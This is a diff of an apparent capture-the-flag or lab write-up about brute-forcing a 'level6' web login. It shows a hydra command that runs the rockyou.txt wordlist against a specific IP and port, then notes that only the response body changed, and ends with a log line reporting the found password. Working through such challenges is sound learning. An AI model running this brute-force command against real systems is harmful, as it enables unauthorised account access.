@@ -55,3 +55,11 @@ finaly the perfect command:
 ```bash
 hydra -vV -l dummy -P rockyou.txt 34.69.146.51 http-get "/level6/?password=^PASS^:F=Invalid password" -s 5000
 ```
+
+so in the end, the point of the drill was to catch the body erturned from the server, and not the header, which i was trying to catch.
+so there was no point in using hydra, or checking for different types of status codes, as the server always returns 200 or 401 status codes.
+and the body is the only thing that changes.
+
+```bash
+
+2024-09-10 13:19:05,289 - logger - CRITICAL - Password successful: dog, Response: {"error":"Request processing took too long and timed out... , try to fetch part of the data by specifying start and end of a batch"}
